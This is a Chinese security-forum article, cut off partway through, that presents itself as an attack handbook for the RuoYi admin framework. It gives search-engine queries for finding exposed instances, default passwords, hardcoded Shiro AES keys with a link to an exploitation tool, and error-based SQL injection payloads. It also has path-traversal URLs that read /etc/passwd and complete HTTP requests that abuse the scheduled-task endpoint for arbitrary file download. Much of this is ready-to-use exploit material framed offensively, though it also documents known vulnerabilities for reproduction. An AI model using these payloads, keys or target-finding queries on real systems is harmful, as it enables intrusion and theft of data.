---
title: 若依(RuoYi)框架漏洞战争手册
url: https://forum.butian.net/share/4328
source: 奇安信攻防社区
date: 2025-05-08
fetch_date: 2025-10-06T22:23:18.954715
---

# 若依(RuoYi)框架漏洞战争手册

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 若依(RuoYi)框架漏洞战争手册

* [渗透测试](https://forum.butian.net/topic/47)

当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。

0x00 前言
=======
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-70d08ec96ea2f07825f835bc6eef521f19e51a1c.png)
简介
--
Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。
若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-492ff605d5b17262081a20aa70de5e0efc3d14c1.png)
\*\*配合ruoyi的服务：\*\*
---------------
```php
alibaba druid
alibaba nacos
spring
redis
mysql
minio
fastjson
shiro
swagger-ui.html
mybatis
```
搜索语法
----
FOFA：
```php
(icon\_hash="-1231872293" || icon\_hash="706913071")
```
Hunter：
```php
web.body="若依后台管理系统"
```
环境搭建
----
新建文件夹，拉起ruoyi源码
```php
git clone https://gitee.com/y\_project/RuoYi
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-610d2d1e010fe80512fffeb77d58d02d3395906f.png)
```php
cd RuoYi
切换版本
git tag -l
切换
git checkout v4.5.1
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-a6a143869925f3633fdc5e5abfde87fd623b3ff9.png)
接下来用idea搭建的
mysql正常用phpstudy搭建就行
日志存放路径需要修改
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-c81205d5a4125703abe5312b88f8e99f476be415.png)
配置mysql
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-3735eabe10bbdde4040a7a3ae7149a1f27166915.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-0ef0cf911ec6745bb415cf7ea8746e0195bea726.png)
启动即可，默认端口80
0x01 弱口令
========
```php
用户：admin ruoyi druid
密码：123456 admin druid admin123 admin888
```
0x02 Shiro默认密钥
==============
漏洞简介
----
若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。
影响版本
----
RuoYi&lt;V-4.6.2
漏洞复现
----
在配置文件中，能够看到shiro的密钥是在配置文件中的
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-a0d4a87cb763e372d2bc278229b5b9d45078d552.png)
漏洞利用工具地址
<https://github.com/SummerSec/ShiroAttack2>
- RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-35954d8d184aff903c46620ad9c50216ffe64298.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-1a0425cfc51b571741a9556a31046b2299f76502.png)
| RuoYi 版本号 | 对象版本的默认AES密钥 |
|---|---|
| 4.6.1-4.3.1 | zSyK5Kp6PZAAjlT+eeNMlg== |
| 3.4-及以下 | fCq+/xW488hMTCD+cmJ3aQ== |
- RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。
0x03 SQL注入
==========
### 注入点1 /role/list接口 （&lt;V-4.6.2）
版本同上4.5.1
首先从源码分析一波
Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-21754c32e7ee55c8f0fb63bb66e209f8304c6242.png)
跳转
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-b7a0cf15d9c1e1d93b55bb523c726355f46d40e9.png)
解释一下 ${params.dataScope}
`${params.dataScope}`这段代码是MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数。这里的`${...}`语法表示取出`params`对象中名为`dataScope`的属性值，并将其直接嵌入到SQL语句中。
`例如，在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录。管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录。在这种情况下，`dataScope`的值可以是一个根据用户角色动态生成的SQL片段，如`"AND dept\\_id IN (SELECT dept\\_id FROM user\\_dept\\_access WHERE user\\_id = #{userId})"`，用以限定查询结果只包含特定部门的用户信息。`
可以看到，在查询的时候，user的属性params是map，在xml中，将dataScope拼接到sql语句后
进入mapper层
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-afc48bdc449fc1984e6487bde50ed56dcd70d88c.png)
跳转到上级
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-c60b9212d1248371e48101797fe6905bbc058b58.png)
进入role查看信息
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-40f4babfde6755d126a4c37a6223abaffcc40b0d.png)
查看功能
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-04ca7a4ed4fd68b6c54cab27805116bf955eaf38.png)
params
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-daf7f70ba7fb7d72cb9901029b796c0b66f8a65d.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-7bb9e7d97760f274c748e7e5e66416e3107f3fb1.png)
根据路径
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-021f64c716284b3018f36aab2f421083e6c9f581.png)
执行代码
```php
&params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-9a89082af235c816b9b413b3582d86de3593a332.png)
### 注入点2 /role/export （&lt;V-4.6.2）
### 注入点3 /user/list （&lt;V-4.6.2）
### 注入点4 /user/list （&lt;V-4.6.2）
### 注入点5 /dept/list （&lt;V-4.6.2）
### 注入点6 /role/authUser/allocatedList （&lt;V-4.6.2）
### 注入点7 /role/authUser/unallocatedList
### 注入点8 /dept/edit （&lt;V-4.6.2）
```php
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#
```
### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）
参考
<https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93>
0x04 CNVD-2021-01931任意文件下载
==========================
#### 漏洞简介
登录后台后可以读取服务器上的任意文件。
#### 影响版本：
RuoYi&lt;4.5.1
#### 漏洞复现
用4.5.0版本
直接搜索关键字，download找到具体的controller
路径
```php
/common/download/resource
```
```php
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/04/attach-3fd1a416231dff796888f2f8a107e0b464c685eb.png)
0x05 CVE-2023-27025 若依任意文件下载
============================
漏洞简介
----
该漏洞是若依（RuoYi）4.7.6 版本中存在的 \*\*权限绕过 + 任意文件下载\*\* 组合漏洞。攻击者通过后台管理接口添加恶意定时任务，修改系统配置文件路径，绕过下载功能的白名单限制，最终实现任意文件下载。漏洞本质是 \*\*权限控制缺失\*\*（允许低权限用户操作敏感接口）和 \*\*路径校验不严\*\*（未对动态修改的配置路径进行二次校验）的综合结果。
影响版本
----
- \*\*若依（RuoYi）&lt;= 4.7.6\*\*
利用条件
----
1. \*\*权限要求\*\*：
- 攻击者需获取管理员 Cookie（如 `JSESSIONID`）或存在其他权限绕过漏洞。
- 若后台接口未授权即可访问，则漏洞危害升级为“未授权任意文件下载”。
2. \*\*系统配置\*\*：
- 目标系统启用了定时任务模块（默认开启）。
漏洞复现
----
#### 添加任务绕过白名单（自定义下载文件路径）
```php
POST /monitor/job/add HTTP/1.1
Host: 10.40.107.67
Cookie: \_tea\_utm\_cache\_10000007=undefined; java-chains-token-key=admin\_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html, image/gif, image/jpeg, \*; q=.2, \*/\*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 214
Connection: close
createBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+\*+\*+\*+\*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```
- 通过调用 `ruoYiConfig.setProfile()` 方法，将系统配置文件路径动态修改为攻击者指定的路径（如 `/Users/apple/Desktop/Locks/javafx.txt`）。
- 此操作绕过了下载功能原本的“固定目录白名单”限制，将下载路径指向自定义位置。
#### \*\*执行定时任务（触发配置修改）\*\*
```php
POST /monitor/job/run HTTP/1.1
Cookie: \_tea\_utm\_cache\_10000007=undefined; java-chains-token-key=admin\_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 10.40.1...